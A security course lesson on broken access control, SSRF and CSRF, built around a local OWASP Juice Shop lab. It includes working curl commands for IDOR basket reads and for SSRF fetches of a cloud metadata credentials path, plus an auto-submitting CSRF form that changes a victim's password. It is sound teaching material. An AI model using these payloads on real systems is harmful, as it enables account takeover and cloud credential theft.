# Day 9 — Web Attacks II: Access Control, SSRF, CSRF

## Objectives

By the end of today you should be able to:

- Say precisely what "broken access control" means as distinct from broken
  *authentication* (Day 4's subject), and exploit the specific, common form
  of it called **IDOR** — an object reference an attacker can simply change
  to someone else's.
- Explain **SSRF** as a *pivot* technique — reaching a host you have no
  direct network route to by making a different, better-connected process
  fetch it on your behalf — and use it to reach a service this lab makes
  genuinely unreachable any other way.
- Name exactly why today's SSRF target sits at `169.254.169.254`, and state
  in one sentence what Day 15 does with that same address for real.
- Build a minimal CSRF PoC and explain why it needs no JavaScript execution
  and no victim click to fire, only an already-authenticated browser
  visiting an attacker-controlled page.
- Place all three of today's bugs on the OWASP Top 10 (2021), and use that
  list as a map for how the rest of this path's web-security days relate to
  each other.
- Name the concrete defense for each bug (server-side ownership checks,
  destination allowlisting, anti-CSRF tokens + `SameSite` cookies) and match
  each to the exact assumption its attack depended on.

## 1. Concept — Authorization, IDOR, SSRF, CSRF, and the OWASP Top 10 as a Map

### Authorization, picking up exactly where Day 4 left off

Day 4 drew the line precisely and pointed forward to today: **authentication**
answers "who are you?"; **authorization** (**authz**) answers "what are you
allowed to do?" — checked *after* identity is already established. Day 4's
whole lab lived on the authentication side (sessions, JWTs, brute force).
Today lives entirely on the other side: every attack below happens against a
**correctly, honestly authenticated** user who simply shouldn't be able to
reach the thing they reach. **Broken access control** is the umbrella term
for that failure class — an authorization check that's missing, wrong, or
too easy to route around.

### IDOR — the single most common shape broken access control takes

An **IDOR** (Insecure Direct Object Reference) is what happens when an
application identifies "which object to show me" by a value the *client*
supplies — a basket ID, an invoice number, a user ID in a URL — and then
trusts that value without separately checking whether the *caller*
requesting it actually owns it. The authentication check ("is there a valid
session/token at all?") passes. The *authorization* check ("does THIS caller
own THIS specific object?") is simply never made. The fix is one sentence,
even though the bug is everywhere: **every object-fetching endpoint must
check ownership (or an explicit permission grant) against the CALLER's
identity, every single time, no exceptions for "it's just a GET."**

### SSRF — not a bug about the target, a bug about the pivot

**SSRF** (Server-Side Request Forgery) is different in shape from every
attack so far this path: the vulnerability isn't in what an attacker can
send *directly* — it's in convincing a server-side process to make a
request *on the attacker's behalf*, to a destination the attacker chose,
that the attacker could never have reached directly themselves. Today's lab
makes that literal rather than abstract: `attacker` has no network route to
`internal` at all — no DNS entry, no route, nothing to connect to. `juiceshop`
does, because this lab dual-homed it onto both networks on purpose. SSRF is
the technique of using `juiceshop`'s network position instead of your own:
hand `juiceshop` a URL through a feature that fetches URLs server-side
(Section 2 uses Juice Shop's real profile-image-by-URL feature for this),
and whatever `juiceshop` can reach, you effectively reach too.

**Why `internal` sits at `169.254.169.254` specifically, and where this goes
next:** that address is not a random pick from a private range — it's the
REAL link-local address AWS, GCP, and Azure all use for their **Instance
Metadata Service (IMDS)**, the thing a cloud VM asks *itself* for its own
temporary IAM credentials, its own instance ID, its own user-data — no
authentication required to ask, by design, because historically only the
instance itself was assumed to be able to reach it. That "only the instance
itself can reach it" assumption is exactly what SSRF breaks, in the cloud
exactly the way today's lab breaks it locally: a vulnerable app running ON
that instance can be tricked into fetching `169.254.169.254` on an
attacker's behalf and handing back real, usable, temporary AWS credentials
— no password, no key, nothing stolen except a URL fetch the app was
already willing to make for something else. **Day 15
(`content/day15-metadata-s3.md`) attacks exactly this, for real, against a
real EC2 instance in your own AWS sandbox** — same address, same pivot
technique, same "the app fetches it, not you" mechanic; only the target
stops being a toy flag and becomes real temporary credentials. Today's
`internal` container (see [`labs/day09/internal/app.py`](../labs/day09/internal/app.py))
deliberately answers a fake version of that exact IMDS URL shape
(`/latest/meta-data/iam/security-credentials/...`) for this reason — the
muscle memory transfers with nothing new to learn about the mechanic itself
when Day 15 changes only the destination.

### CSRF — the browser does the attacking, not the attacker

**CSRF** (Cross-Site Request Forgery) exploits one specific, easy-to-forget
browser behavior: cookies are attached to a request based on **which site
the request is going TO**, not which site the page making the request came
FROM. If `victim.com` already has you logged in (a session cookie sitting in
your browser), any other page you visit — `attacker.com`, an email, a forum
post — can embed a request *to* `victim.com`, and your browser will happily
attach your `victim.com` cookie to it, no matter where the request
originated. No password theft, no XSS, no JavaScript execution even
required — a plain `<img src="https://victim.com/change-password?...">` is
enough if the target endpoint (a) accepts state-changing GET requests and
(b) checks nothing except "is a valid session cookie present." Two
independent defenses close this, and either alone would stop it:

- **`SameSite` cookies** — a cookie attribute telling the *browser itself*
  not to attach the cookie to cross-site requests at all (`Strict`/`Lax`),
  so the forged request arrives with no session cookie, indistinguishable
  from a logged-out visitor.
- **Anti-CSRF tokens** — a random, unguessable value the server issues and
  requires back on every state-changing request, delivered somewhere a
  cross-site page has no way to read (a hidden form field, not a cookie
  alone) — so even a request that DOES carry the session cookie fails
  without also carrying a token the attacker's page never had access to.

### The OWASP Top 10 (2021) as a map for this whole path

The **OWASP Top 10** is a periodically-updated ranking of the most impactful
web application risk categories, used industry-wide as a shared vocabulary.
Today's three bugs land on it precisely, and seeing where is useful as a map
of how this path's web days relate:

| 2021 category | What it covers | Where in this path |
|---|---|---|
| A01: Broken Access Control | IDOR and authorization failures generally | **Today** |
| A02: Cryptographic Failures | weak/misused crypto | Day 3 |
| A03: Injection | SQLi, command injection, XSS | Day 8 |
| A04: Insecure Design | missing security requirements up front | (named, not a dedicated day) |
| A05: Security Misconfiguration | default creds, verbose errors, open panels | Day 1 |
| A06: Vulnerable and Outdated Components | known-CVE dependencies | Day 10 |
| A07: Identification and Authentication Failures | sessions, JWTs, brute force | Day 4 |
| A08: Software and Data Integrity Failures | unsigned updates, insecure deserialization | (named, not a dedicated day) |
| A09: Security Logging and Monitoring Failures | can't detect what you don't log | Day 11 |
| A10: Server-Side Request Forgery | today's SSRF | **Today** |

**One deliberate, worth-naming gap:** CSRF has **no dedicated 2021 category**
at all — it was a numbered category in the 2013 list, then dropped, because
modern frameworks now ship CSRF protection (tokens, `SameSite` defaults) on
by default widely enough that its overall prevalence fell out of the
top-10 cut. That drop is itself a lesson, not an oversight to shrug past:
CSRF didn't stop being a real bug class — it stopped being the *default*
outcome of using a modern framework correctly. It resurfaces the moment a
team disables a default, rolls hand-written endpoints (exactly what today's
lab's CSRF step targets), or ships an API consumed in a way that bypasses
the framework's own protection. Drill 4 below asks you to reason through
this distinction directly.

## 2. Attack Lab — IDOR, SSRF, CSRF Against `juiceshop` + `internal`

**Authorized use only:** everything below runs against `juiceshop` (a real
OWASP Juice Shop instance) and `internal` (a service this lab wrote), both
started on the shared `cyberlab`/`day09-app` networks — never against a real
account, a real internal service, or a Juice Shop instance you don't own or
don't have explicit written authorization to test.

Bring up both labs (after `labs/base/up.sh` if you haven't already), and
stage this lab's local defense-demo script with a plain `cp` (no extra
container needed — `/loot` is just a bind mount, same pattern as every
earlier day):

```sh
cd cyber_security/labs/base
./up.sh
cd ../day09
docker compose up -d --build
mkdir -p ../base/loot/day09
cp authz_ssrf_defense.py ../base/loot/day09/
```

`labs/day09/docker-compose.yml` adds `juiceshop` and `internal` — it does
**not** redefine `attacker`. Every command below runs from `labs/base`,
where `attacker` is actually defined. Full detail, including the exact
network topology diagram and why `attacker` genuinely cannot reach
`internal` directly: [`labs/day09/README.md`](../labs/day09/README.md).

### Step 1 — Confirm the topology before attacking it

```sh
cd cyber_security/labs/base
docker compose exec attacker sh -c "curl -s juiceshop:3000/rest/user/whoami"
docker compose exec attacker sh -c "curl -m 3 -s internal/flag; echo EXIT:\$?"
```

**What you should see:** the first command succeeds (`juiceshop` is on
`cyberlab`, directly reachable). The second one fails outright — a
connection error and a non-zero exit — because `internal` is on `day09-app`
only, and `attacker` has no route there at all. Confirming that failure
*before* attacking is the point: it proves whatever you reach in Step 3 was
reached *through* `juiceshop`, not by some network path you already had.

### Step 2 — IDOR: read another user's basket

Register two accounts, log in as the first, and request the **second
account's** basket ID instead of your own:

```sh
docker compose exec attacker sh -c "
curl -s -X POST juiceshop:3000/api/Users/ -H 'Content-Type: application/json' -d '{\"email\":\"user1@cyberlab.test\",\"password\":\"pass12345\"}'
curl -s -X POST juiceshop:3000/api/Users/ -H 'Content-Type: application/json' -d '{\"email\":\"user2@cyberlab.test\",\"password\":\"pass12345\"}'
TOKEN=\$(curl -s juiceshop:3000/rest/user/login -H 'Content-Type: application/json' -d '{\"email\":\"user1@cyberlab.test\",\"password\":\"pass12345\"}' | jq -r .authentication.token)
curl -s juiceshop:3000/rest/basket/2 -H \"Authorization: Bearer \$TOKEN\"
"
```

**What you should see:** account 1's token successfully reads basket ID `2`
— which belongs to account 2, not account 1 — because `GET /rest/basket/:id`
checks "is there a valid token at all," never "does this token's owner
actually own basket `2`." This is Juice Shop's documented "Basket Access"
challenge; confirm it via Juice Shop's own Score Board
(`/#/score-board`) flipping that challenge to solved. Full detail, and an
honest note on what this session did vs. didn't live-capture:
[`labs/day09/SOLUTION.md`](../labs/day09/SOLUTION.md).

### Step 3 — SSRF: reach `internal` through `juiceshop`

Use Juice Shop's real profile-image-by-URL feature — an endpoint that
fetches a URL server-side and stores the response as your profile image,
with no check on *where* that URL points:

```sh
docker compose exec attacker sh -c "
TOKEN=\$(curl -s juiceshop:3000/rest/user/login -H 'Content-Type: application/json' -d '{\"email\":\"user1@cyberlab.test\",\"password\":\"pass12345\"}' | jq -r .authentication.token)
curl -s -X PUT juiceshop:3000/profile/image/url -H \"Authorization: Bearer \$TOKEN\" -H 'Content-Type: application/json' -d '{\"url\":\"http://internal/flag\"}'
curl -s -X PUT juiceshop:3000/profile/image/url -H \"Authorization: Bearer \$TOKEN\" -H 'Content-Type: application/json' -d '{\"url\":\"http://169.254.169.254/latest/meta-data/iam/security-credentials/cyberlab-day09-role\"}'
"
```

**What you should see:** both requests succeed from `juiceshop`'s side —
it fetches whatever URL it's handed, on the `day09-app` network it shares
with `internal`, and stores the response (the toy flag, then the fake
credentials JSON) as your profile image content, readable back via your own
profile. You never touched `internal` directly — Step 1 proved you
couldn't — `juiceshop` did, because you controlled the URL it was told to
fetch. Confirm via the Score Board's "SSRF" challenge. This second URL is
the one that matters most going forward: it's the exact address and exact
technique Day 15 uses against a real cloud IMDS.

### Step 4 — CSRF: a silent password change

This step needs a real browser with a real Juice Shop session in it — the
IDOR and SSRF steps above run entirely from `attacker`'s shell, but CSRF
exploits browser cookie-attachment behavior, which only means something
with an actual browser involved. Expose `juiceshop`'s port to your host
(temporarily add `ports: ["3000:3000"]` to its service in
`docker-compose.yml`, `docker compose up -d`), log in through the UI, then
open [`labs/day09/csrf_poc.html`](../labs/day09/csrf_poc.html) (edited to
point at wherever you exposed Juice Shop) in a second tab of the same
browser.

**What you should see:** the page's hidden `<img>` tag fires a cross-site
GET at `/rest/user/change-password?...` automatically on load — no click,
no visible action — carrying your already-present Juice Shop session
cookie. Log out and confirm your old password no longer works, and
`csrf-owned123` does. Full setup detail:
[`labs/day09/README.md`](../labs/day09/README.md)'s "Browser-based steps."

### Verify

```sh
cd cyber_security/labs/base
docker compose exec attacker sh -c "curl -s juiceshop:3000/rest/user/whoami >/dev/null && echo TARGET_OK"
```

Expected: `TARGET_OK`. Full walkthrough and honest scope notes:
[`labs/day09/SOLUTION.md`](../labs/day09/SOLUTION.md).

## 3. Defense Lab — Ownership Checks, an SSRF Allowlist, and Anti-CSRF Controls

Because `juiceshop` is a real, unmodified upstream image, this lab doesn't
own its source the way Day 4 owned `target/app.py` — there's no
`docker compose up -d --build` re-verify against Juice Shop's own code to
run here. Instead, both code-level fixes below are re-verified against a
small, local, dependency-free script this lab DOES own —
[`labs/day09/authz_ssrf_defense.py`](../labs/day09/authz_ssrf_defense.py) —
using the exact same before/after, edit-and-rerun pattern Day 4 used against
a live container, just without a server in the loop. CSRF's fix is named
precisely, matching Day 4's honest-scope-boundary pattern for a control this
lab doesn't independently rebuild-and-reverify.

### Defense 1 — Ownership check on every object access (re-verified locally)

Run the script as shipped (the vulnerable `can_access_basket` always
returns `True`, matching Step 2's live IDOR):

```sh
cd cyber_security/labs/base
docker compose exec attacker sh -c "python3 /loot/day09/authz_ssrf_defense.py"
```

**What you should see:** the IDOR test case (`user=42` requesting
`owner=7`'s basket, not an admin) reports `FAIL` — the function grants
access it shouldn't. Edit the file (uncomment the AFTER line the file's own
comments point you to: `return is_admin or requesting_user_id ==
basket_owner_id`), re-run, and that same case flips to `PASS` — same input,
opposite, correct outcome, because the check now actually compares the
caller's identity against the object's owner instead of skipping that
comparison entirely. Full captured before/after: `labs/day09/SOLUTION.md`.

### Defense 2 — An SSRF allowlist, not a blocklist (re-verified locally)

Same script, same run. **What you should see:** `169.254.169.254`,
`127.0.0.1`, and `internal` (by DNS name) all report `FAIL` in the
vulnerable version — the fetcher accepts every destination with no check at
all. Edit the file to the AFTER version (`return url_host in
ALLOWED_HOSTS`) and re-run: all three flip to `PASS`, denied outright.

**The specific design choice worth naming:** the fix is a strict
**allowlist** (only an explicitly-named legitimate destination is fetchable)
rather than a **blocklist** of private/link-local IP prefixes. A blocklist
has to enumerate every private range and stay exhaustive forever — and it's
still bypassable by phrasing the same address a different way (a DNS name
that resolves to a blocked IP, a redirect the fetcher follows blindly,
decimal/octal IP encoding). Default-deny-unless-explicitly-allowed can't be
bypassed that way, which is exactly why it correctly rejects `internal`
by its *hostname* too, not just by matching its IP against a list.

### Defense 3 — Anti-CSRF tokens + `SameSite` cookies (named, not re-demonstrated live)

Unlike Defenses 1–2, this lab doesn't rebuild Juice Shop's own session/cookie
handling to re-verify this live — that would mean patching upstream Juice
Shop source, out of scope for a black-box target the way `juiceshop`'s
vulnerabilities are meant to be attacked here, not patched. Named precisely
instead, matching Day 4's pattern for a control described but not
independently rebuilt-and-reverified this lab:

- **Anti-CSRF tokens** — the server issues a random, unguessable value with
  the form/page, and requires it back, unchanged, on the actual
  state-changing request. An attacker's cross-site page has no way to read
  that value (same-origin policy blocks reading another origin's response
  body), so it can forge the *request* but never the *token* that request
  needs to succeed.
- **`SameSite=Lax` or `Strict` cookies** — tells the browser itself not to
  attach the cookie on cross-site requests at all, so Step 4's forged
  request would arrive with no session cookie present — indistinguishable
  from a logged-out visitor, regardless of what token checking is or isn't
  in place.
- Either control alone breaks Step 4's specific PoC; real production
  systems generally ship both, since `SameSite` protects the cookie
  transport layer while tokens protect the specific request regardless of
  how the cookie ended up attached.

## 4. Drills

Attempt each drill yourself before reading its solution sketch.

### Drill 1 — Craft the IDOR request

Two Juice Shop accounts exist: yours, with basket ID `5`, and a victim's,
with basket ID `6`. You have a valid `Authorization: Bearer` token for your
own account only. Write the exact `curl` command that reads the victim's
basket contents.

**Hint:** the vulnerability is that the endpoint checks "is this token
valid at all," never "does this token's owner own THIS basket ID" — so the
only thing that needs to change from a legitimate request to your own
basket is the ID in the URL path. Nothing about the token itself needs to
be forged or stolen.

**Solution sketch:**

```sh
curl -s juiceshop:3000/rest/basket/6 -H "Authorization: Bearer <your-own-valid-token>"
```

Your own, entirely legitimate token — issued for basket `5` — successfully
reads basket `6`'s contents, because `GET /rest/basket/:id` never compares
the token's owner against the requested basket's owner. Nothing about the
attack requires forging anything; it requires exactly one thing: an
authorization check that was never written.

### Drill 2 — Why blocking `169.254.169.254` matters (ties forward to Day 15)

In two or three sentences: explain specifically why an SSRF allowlist that
blocks `169.254.169.254` matters more than blocking an arbitrary private IP,
and name what this exact block prevents in a real cloud deployment.

**Hint:** think about what's normally sitting behind that one specific
address on a real cloud VM, and who that thing was designed to trust by
default.

**Solution sketch:** `169.254.169.254` is the fixed, universal address
every major cloud provider's Instance Metadata Service listens on — the
service a VM asks for its own temporary IAM credentials, with historically
no authentication required, because the service assumed only the instance
itself could ever reach it. An SSRF bug in any app running on that instance
breaks that assumption directly: the vulnerable app fetches
`169.254.169.254` on the attacker's behalf and hands back real, usable
temporary cloud credentials — not a toy flag, not a password, a working set
of API keys scoped to whatever role that instance was given. Blocking a
random private IP stops an attacker from reaching some internal service;
blocking this specific address stops an attacker from walking straight out
of the web app and into the cloud account that's hosting it. This is
precisely what Day 15's Attack Lab does for real, against a real EC2
instance, and precisely what Day 15's Defense Lab (enforcing IMDSv2,
which requires a session token an SSRF'd simple GET can't supply) closes.

### Drill 3 — Build a minimal CSRF form

Juice Shop's `POST /rest/user/change-password` accepts `current`, `new`, and
`repeat` fields and has no anti-CSRF token requirement. Write the minimal
HTML page that changes a logged-in victim's password to `pwned123` the
moment they load the page, no click required.

**Hint:** a `<form>` alone doesn't submit itself — something has to trigger
`.submit()`. The victim's browser attaches the session cookie automatically
because the request's *destination*, not its *origin*, is what a cookie is
scoped to.

**Solution sketch:**

```html
<form id="f" action="http://juiceshop-host:3000/rest/user/change-password" method="POST">
  <input type="hidden" name="current" value="">
  <input type="hidden" name="new" value="pwned123">
  <input type="hidden" name="repeat" value="pwned123">
</form>
<script>document.getElementById("f").submit();</script>
```

Loading this page in a browser where the victim is already logged into
Juice Shop submits the form automatically; the browser attaches the
existing Juice Shop session cookie to the POST because it's a request *to*
Juice Shop's domain, regardless of which page's HTML triggered it. No token
is required by the endpoint, so the request succeeds and the password
changes with zero interaction beyond "loaded this page."

### Drill 4 — Why CSRF has no OWASP Top 10 (2021) category, and why that isn't "solved"

Section 1's table shows CSRF isn't a numbered 2021 category at all, unlike
2013. In two or three sentences: explain why it was dropped, and why that
drop doesn't mean CSRF stopped being a real, exploitable bug class.

**Hint:** think about what changed between 2013 and 2021 — was it that CSRF
became harder to exploit in principle, or that fewer real applications
still had the specific gap it needs?

**Solution sketch:** CSRF was dropped from the numbered 2021 list because
modern web frameworks now ship CSRF protection (anti-CSRF tokens, or
`SameSite`-defaulted session cookies) on **by default**, widely enough that
CSRF's real-world prevalence across audited applications fell below the
cutoff for a top-10 slot — not because the underlying browser
cookie-attachment behavior changed, and not because the attack got harder
to execute in principle. It resurfaces exactly where a team opts out of a
framework default, hand-rolls an endpoint the way Juice Shop's
`change-password` route does for this lab, or exposes an API in a way the
framework's built-in protection doesn't cover. "Not in the top 10 anymore"
describes *how common* the gap has become across a large sample of real
apps, not *whether the technique still works* the instant the gap is
present — Step 4 above is the same 2013-era CSRF, working exactly the same
way, against a specific route that happens to still have the gap.

## 5. Journal Prompt

Open `journal.md` and write today's entry using the template at the top of
that file:

- **What I attacked:** name specifically which basket ID you read that
  wasn't yours, which URL you got `juiceshop` to fetch on your behalf and
  what came back, and whether you completed the browser-based CSRF step
  live or only worked through Drill 3's PoC conceptually — being precise
  about which was hands-on and which wasn't is the same honesty habit Day 4
  asked for.
- **How:** which of today's three attacks felt most different in *kind*
  from Days 1–8's attacks, and why — SSRF in particular depends on a
  network topology argument (who can reach what) rather than a payload or a
  cracked secret.
- **What defended it:** which of `authz_ssrf_defense.py`'s two functions did
  you personally edit and re-run, and what flipped from FAIL to PASS?
- **What confused me:** anything about why an allowlist is structurally
  better than a blocklist for Defense 2, or about why `169.254.169.254`
  specifically (versus any other private address) is the one this lab
  spent the most time on, that didn't click on first pass.
- **One thing to revisit:** pick one term from today (authz, IDOR, broken
  access control, SSRF, CSRF, `SameSite`, link-local metadata) to
  re-explain from memory before Day 10, without looking back at this file.
